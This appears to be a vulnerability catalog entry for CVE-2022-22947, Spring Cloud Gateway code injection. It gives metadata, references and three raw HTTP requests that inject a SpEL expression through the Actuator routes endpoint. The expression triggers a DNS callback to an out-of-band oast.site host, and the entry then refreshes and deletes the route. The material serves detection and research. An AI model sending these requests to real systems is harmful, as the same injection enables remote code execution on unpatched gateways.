---
layout: post
cve_id: CVE-2022-22947
title: Spring Cloud Gateway Code Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-22947.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-22947.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: critical
impact: 'Successful exploitation of this vulnerability could lead to remote code execution,
  compromising the confidentiality, integrity, and availability of the affected system.

  '
remediation: 'Apply the latest security patches provided by the vendor and ensure
  proper input validation to prevent code injection attacks.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2022-22947
- https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/
- https://github.com/wdahlenburg/spring-gateway-demo
- https://spring.io/blog/2022/03/01/spring-cloud-gateway-cve-reports-published
- https://tanzu.vmware.com/security/cve-2022-22947
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2022-22947
  cwe-id: CWE-917,CWE-94
  epss-score: 0.94461
  epss-percentile: 0.99994
  cpe: cpe:2.3:a:vmware:spring_cloud_gateway:*:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: vmware
  product: spring_cloud_gateway
tags:
- cve
- cve2022
- apache
- spring
- vmware
- actuator
- oast
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+ are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.

## üåê HTTP Request
```nohighlight
POST /actuator/gateway/routes/38F6Pkfo5Yg2iqDhrmBJqmQNgR9 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Content-Length: 413
Content-Type: application/json
Accept-Encoding: gzip

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/38F6Pkfo5Yg2iqDhrmBJqmQNgR9/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.net.InetAddress).getByName(\"d5jm3p9le0o38128psogm719jjpi6r9ac.oast.site\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "/",
  "order": 0
}
```

```nohighlight
POST /actuator/gateway/refresh HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Connection: close
Content-Length: 317
Content-Type: application/json
Accept-Encoding: gzip

{
  "predicate": "Paths: [/38F6Pkfo5Yg2iqDhrmBJqmQNgR9], match trailing slash: true",
  "route_id": "38F6Pkfo5Yg2iqDhrmBJqmQNgR9",
  "filters": [
    "[[RewritePath #{T(java.net.InetAddress).getByName(\"d5jm3p9le0o38128psogguic3rot586x7.oast.site\")} = /${path}], order = 1]"
  ],
  "uri": "/",
  "order": 0
}
```

```nohighlight
DELETE /actuator/gateway/routes/38F6Pkfo5Yg2iqDhrmBJqmQNgR9 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

